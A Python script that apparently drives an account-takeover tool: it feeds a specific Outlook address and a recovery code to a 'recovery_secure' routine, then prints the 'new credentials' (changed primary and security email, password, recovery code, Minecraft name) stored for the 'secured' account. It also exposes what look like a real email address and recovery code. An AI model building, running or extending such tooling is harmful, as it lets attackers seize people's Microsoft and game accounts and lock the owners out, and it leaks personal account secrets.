#!/usr/bin/env python3
"""Full recovery_secure + primary change on the provided test account."""
from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from securing.recovery_secure import recovery_secure


async def main():
    account = await recovery_secure(
        email="amazing_fam.iyq28s64@outlook.com",
        method="rcode",
        data={"recovery_code": "J5UKS-YF48X-CNYK5-9F88W-MRZZG"},
    )
    if account == "invalid" or (isinstance(account, dict) and account.get("failed")):
        print("FAILED", account.get("reason") if isinstance(account, dict) else account)
        if isinstance(account, dict) and account.get("hit_embed"):
            # print fields
            for f in account["hit_embed"].fields:
                print(f.name, f.value)
        return

    ms = {}
    # pull from details
    details = (account or {}).get("details") or {}
    print("account_id", account.get("account_id"))
    # load from DB
    from database.database import DBConnection

    with DBConnection() as db:
        row = db.get_secured_account(account["account_id"])
    if row:
        print("\n=== NEW CREDENTIALS ===")
        print("primary:", row.get("ms_email"))
        print("security:", row.get("ms_security_email"))
        print("password:", row.get("ms_password"))
        print("recovery:", row.get("ms_recovery_code"))
        print("mc:", row.get("mc_name"))
        print("original kept?:", "sunny" in str(row.get("ms_email") or "").lower())
    else:
        print("no db row", account.keys())


if __name__ == "__main__":
    asyncio.run(main())
